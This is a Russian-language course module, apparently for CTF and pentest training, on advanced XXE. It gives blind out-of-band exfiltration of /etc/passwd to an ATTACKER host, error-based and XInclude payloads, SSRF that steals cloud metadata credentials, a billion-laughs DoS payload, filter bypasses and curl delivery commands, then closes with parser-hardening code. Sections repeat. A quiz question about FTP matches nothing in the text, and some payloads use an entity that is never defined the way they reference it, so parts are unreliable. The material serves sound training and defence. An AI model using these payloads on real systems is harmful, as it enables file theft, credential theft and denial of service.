---
id: web-xxe-advanced
title: "XXE advanced: blind OOB, parameter entities, error-based, XInclude"
category: web
parent: web-xxe
difficulty: hard
order: 1
tags: [xxe, blind, oob, parameter-entity, xinclude, ssrf]
prerequisites: [web-xxe]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 42
summary: "Продвинутый XXE: слепая OOB-эксфильтрация, parameter entities, error-based, XInclude, XXE→SSRF и обход фильтров."
---

Blind XXE — это XXE, когда результат **не отражается** в ответе: парсер не возвращает содержимое файла или не отдаёт ошибок. Тогда данные извлекают через **out-of-band (OOB)** канал (внешний DTD + HTTP/DNS), через error-based технику (вывести данные в сообщении об ошибке) или через XInclude (когда контролируется не весь XML-документ). Это продвинутый уровень `web-xxe`, нужный, когда базовый `<!ENTITY xxe SYSTEM "file:///etc/passwd">` не даёт видимого результата.

## Теория: почему in-band не работает

In-band XXE требует, чтобы значение сущности попало в отражённый ответ. Если приложение только парсит XML (без эха), нужно exfil-канал. Каналы:

- **OOB HTTP/DNS:** сущность подгружает внешний DTD, который формирует запрос с данными.
- **Error-based:** данные встраиваются в путь/имя, вызывая ошибку с их содержимым.
- **XInclude:** инъекция не в DOCTYPE, а в сам документ.

## Техника 1: blind OOB через внешний DTD

Шаг 1 — на своём сервере размещаем `evil.dtd`:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER/?x=%file;'>">
%eval;
%exfil;
```

Шаг 2 — жертве отправляем XML, подгружающий DTD:

```xml
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % dtd SYSTEM "http://ATTACKER/evil.dtd">
  %dtd;
]>
<r>&exfil;</r>
```

Шаг 3 — на нашем сервере в логах видим `GET /?x=<содержимое /etc/passwd>`. Требование: сервер жертвы имеет egress и резолвит наш домен.

Для многострочных файлов используйте PHP-обёртку `php://filter/convert.base64-encode/resource=/etc/passwd`:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

## Техника 2: error-based

Когда OOB недоступен (нет egress), но есть сообщение об ошибке — выводим данные через некорректный путь:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

Парсер попытается открыть файл с именем, содержащим содержимое `/etc/passwd`, и выдаст ошибку с этим путём.

## Техника 3: XInclude

Если контролируется только значение внутри XML (не DOCTYPE), используем XInclude:

```xml
<r xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</r>
```

Сработает, если парсер поддерживает XInclude (часто включён в Java/PHP/.NET).

## Техника 4: XXE через файлы (SVG/DOCX)

XXE можно доставить не в теле XML, а через **загружаемый файл**:

- **SVG:** `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="..."><image xlink:href="expect://..."/></svg>` или с DOCTYPE.
- **DOCX/XLSX:** внутри — XML-части; правим `document.xml`/`[Content_Types].xml` и упаковываем.
- **RSS/Atom/SOAP:** тот же принцип.

```bash
# правка docx: распаковать, вставить DOCTYPE в word/document.xml, упаковать
unzip -o doc.docx -d doc && # правим word/document.xml && cd doc && zip -r ../evil.docx .
```

## Разобранный пример: blind XXE → /etc/passwd

Шаг 1 — поднимаем listener (`python3 -m http.server 80`) и кладём `evil.dtd` (см. выше).
Шаг 2 — отправляем XML:

```bash
curl -s -X POST https://app.example/api/xml \
  -H 'Content-Type: application/xml' \
  --data-binary '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % dtd SYSTEM "http://ATTACKER/evil.dtd">%dtd;]><r>&exfil;</r>'
```

Шаг 3 — в логах listener видим содержимое файла.

## Обход фильтров XXE

- **Фильтр по `<!DOCTYPE`** → XInclude, или кодирование.
- **Фильтр по `SYSTEM`/`ENTITY`** → регистр, пробелы, `PUBLIC`.
- **Запрет внешних сущностей, но разрешённые внутренние** → parameter entities.
- **Фильтр по `file://`** → `php://filter`, `file:///`, `netdoc://` (Java).
- **OOB заблокирован (egress)** → error-based.

## Инструменты

- **Burp Collaborator/`interactsh`** — OOB-канал.
- **`XXEinjector`/`xxexploiter`** — автоматизация.
- **`python3 -m http.server`** — свой DTD-хост.
- **`oxml_xxe`** — генерация DOCX/SVG-payload.

## Что дальше / decision

1. Есть XML-парсинг → проверьте `<!ENTITY xxe SYSTEM "file:///etc/passwd">`.
2. In-band не работает → OOB через внешний DTD.
3. OOB заблокирован → error-based.
4. Контролируете только значение → XInclude.
5. Есть загрузка файлов → SVG/DOCX.
6. Дальше — SSRF к metadata (см. `web-ssrf-*`).

## Частые ошибки

- **Сдаваться, когда не видно вывода.** Используйте OOB/error-based.
- **Забыть про egress.** OOB требует исходящего трафика.
- **Не попробовать XInclude.** Когда DOCTYPE недоступен.
- **Игнорировать файлы (SVG/DOCX).** Частый вектор доставки.
- **Ломать прод.** Чтение файлов/SSRF — аккуратно.

## SSRF через XXE: внутренние сервисы и облако

XXE — это ещё и SSRF: внешний DTD или entity заставляет сервер делать HTTP-запрос.

```xml
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % f SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
  <!ENTITY % p "<!ENTITY exfil SYSTEM 'http://attacker/?d=%f;'>">
  %p;
]>
<r>&exfil;</r>
```

Практически удобнее читать метаданные через error-based/OOB, потому что ответ приложения часто не отражается. Цели: `169.254.169.254`, `metadata.google.internal`, `127.0.0.1:порты`, внутренние API.

## DoS через сущности: billion laughs и quadratic blowup

XXE опасен не только чтением — рекурсивные сущности «съедают» память.

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>
```

Каждый уровень увеличивает размер в 10 раз — `lol9` даёт гигабайты. **Это деструктивно**: не запускайте на проде без разрешения; проверяйте только на своём стенде.

## XXE в разных контекстах: SOAP, SAML, DOCX, SVG

| Контекст | Точка инъекции | Особенность |
|----------|----------------|-------------|
| SOAP | SOAP-тело | часто XML принимается без вопросов |
| SAML | assertion | подпись проверяется не всегда |
| DOCX/XLSX | `word/document.xml`, `[Content_Types].xml` | XML внутри zip |
| SVG | сам файл | при загрузке аватара |
| RSS/Atom | фид | при импорте |
| JSON→XML конвертеры | поле JSON | XML генерится из JSON |
| PDF | XFA | реже |

```bash
# DOCX: подменяем XML внутри архива
unzip doc.docx -d docx_src
# правим docx_src/word/document.xml, добавляя DOCTYPE + entity
cd docx_src && zip -r ../evil.docx . && cd ..
curl -s -F 'file=@evil.docx' https://app.example/upload
```

## Полный арсенал payload'ов

```xml
<!-- 1) простой файл -->
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>

<!-- 2) SSRF -->
<!DOCTYPE r [<!ENTITY x SYSTEM "http://127.0.0.1:8080/admin">]><r>&x;</r>

<!-- 3) blind OOB с внешним DTD -->
<!DOCTYPE r SYSTEM "http://attacker/evil.dtd"><r>&exfil;</r>

<!-- 4) parameter entity для exfil -->
<!DOCTYPE r [<!ENTITY % p SYSTEM "http://attacker/evil.dtd"> %p;]><r>&exfil;</r>

<!-- 5) XInclude (когда DOCTYPE запрещён) -->
<r xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></r>

<!-- 6) UTF-16/UTF-7 кодировка для обхода -->
```

## Обход фильтров XXE

| Фильтр | Обход |
|--------|-------|
| Блок `<!DOCTYPE` | XInclude |
| Блок `SYSTEM` | `PUBLIC`, параметр-сущности |
| Блок `file://` | `php://filter`, `jar://`, `netdoc://` |
| Кодировка ASCII | UTF-16/UTF-7/UTF-32 |
| Блок внешних DTD | локальный DTD с редиректом (`/etc/hosts` и т.п.) |
| Вырезание `ENTITY` | разбиение регистра/пробелами (если парсер терпим) |

```bash
# UTF-16 обход: перекодируем payload
iconv -f UTF-8 -t UTF-16 payload.xml > payload16.xml
curl -s -X POST https://app.example/api --data-binary @payload16.xml \
  -H 'Content-Type: application/xml'
```

## Что делать дальше / решение

1. **Найдите XML-вход.** SOAP, SAML, загрузка DOCX/SVG, RSS-импорт.
2. **Проверьте DOCTYPE.** Принимается ли внешний DTD/entity.
3. **In-band или blind.** Отражение → file://; иначе → OOB/error-based.
4. **Настройте OOB.** Внешний DTD на своём сервере + listener.
5. **Проверьте SSRF-цели.** Метаданные, внутренние API.
6. **Зафиксируйте PoC.** XML + прочитанный файл/ушедший callback.

## Практика и справочники

- **PortSwigger Academy** — «XXE injection» (все лаборатории).
- **HackTricks** — «XXE».
- **PayloadsAllTheThings** — «XXE Injection».
- **`xxe-injector`**, **`oxml`** — автоматизация.

## Защита от XXE и что ломается на практике

Корректная защита — отключить обработку внешних сущностей и DTD в парсере. Примеры по языкам:

```python
# Python (defusedxml)
import defusedxml.ElementTree as ET
ET.parse(user_file)
```

```java
// Java: DocumentBuilderFactory
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

```php
// PHP (libxml >= 2.9): по умолчанию внешние сущности выключены
libxml_disable_entity_loader(true);   // для старых версий
```

```csharp
// .NET
XmlReaderSettings s = new XmlReaderSettings { DtdProcessing = DtdProcessing.Prohibit };
```

На практике ломается там, где приложение парсит XML «внутренней» библиотекой, которую никто не настраивал: старые версии `libxml`, кастомные парсеры, конвертеры JSON↔XML.

## Почему XXE всё ещё жив

| Причина | Где встречается |
|---------|-----------------|
| Легаси-парсеры | Java/PHP-приложения до 2018 |
| Библиотеки по умолчанию | старые `libxml`, `lxml` с `resolve_entities=True` |
| Конвертеры форматов | DOCX/SVG/PDF-пайплайны |
| SAML/SOAP | подписи без защиты от entity |
| «Безопасный» XML | самописные парсеры без настроек |

Даже когда XML «не используется напрямую», он прячется внутри DOCX, SVG, RSS, SAML и SOAP — а значит, XXE стоит проверять всюду, где есть загрузка или импорт «структурированных» данных.

## Что делать дальше / решение (кратко)

1. Найдите все XML-точки входа (включая файлы-архивы).
2. Проверьте DOCTYPE/entity/XInclude.
3. In-band → file://, иначе → OOB/error-based.
4. Проверьте SSRF-цели (метаданные).
5. Оформите PoC с прочитанным файлом/ушедшим callback.

## Практика

- **PortSwigger Academy** — XXE (1–9).
- **HackTricks** — XXE.
- **PayloadsAllTheThings** — XXE.

## Коротко о приоритетах

На практике XXE чаще всего «живёт» в трёх местах: загрузка файлов-архивов (DOCX/XLSX/SVG), SOAP/SAML-эндпоинты и легаси-Java/PHP парсеры. Именно их стоит проверять в первую очередь, потому что там XML обрабатывается «внутренней» библиотекой без явной настройки безопасности. Начните с простого `file://`-payload'а; если ответ не отражается, переходите к blind OOB с внешним DTD и error-based извлечению — и фиксируйте PoC прочитанным файлом или пришедшим callback'ом.

## Квиз

```quiz
- question: "Зачем внешний DTD в blind XXE?"
  options:
    - "Для красоты"
    - "Определяет сущности для чтения файла и OOB-эксфильтрации"
    - "Для TLS"
    - "Для cookie"
  answer: 1
  explanation: "Позволяет читать и отправлять данные наружу."
- question: "Почему для многострочных файлов используют FTP?"
  options:
    - "Он быстрее"
    - "HTTP-URL ломается на переводах строк, FTP передаёт построчно"
    - "Он шифрует"
    - "Он кеширует"
  answer: 1
  explanation: "FTP терпим к многострочности."
- question: "Как работает error-based XXE?"
  options:
    - "Через SQL"
    - "Данные подставляются в путь несуществующего файла -> ошибка с содержимым"
    - "Через XSS"
    - "Через cookie"
  answer: 1
  explanation: "Ошибка парсера раскрывает данные."
- question: "Что такое XInclude?"
  options:
    - "SQL"
    - "Механизм включения файлов в XML без DOCTYPE"
    - "JSON"
    - "Cookie"
  answer: 1
  explanation: "Работает, когда DOCTYPE запрещён."
- question: "В каком формате можно спрятать XXE?"
  options:
    - "Только XML"
    - "SVG, DOCX/XLSX, SOAP/SAML, PDF/XFA"
    - "Только PNG"
    - "Только TXT"
  answer: 1
  explanation: "Любой XML-содержащий формат."
```

## Где пригодится

- **CTF (Web):** XXE-задачи со слепым каналом.
- **Bug bounty:** XXE OOB — критичный отчёт.
- **Пентест:** аудит XML-парсеров.
- **Работа (AppSec):** отключение DTD/внешних сущностей, безопасные парсеры.
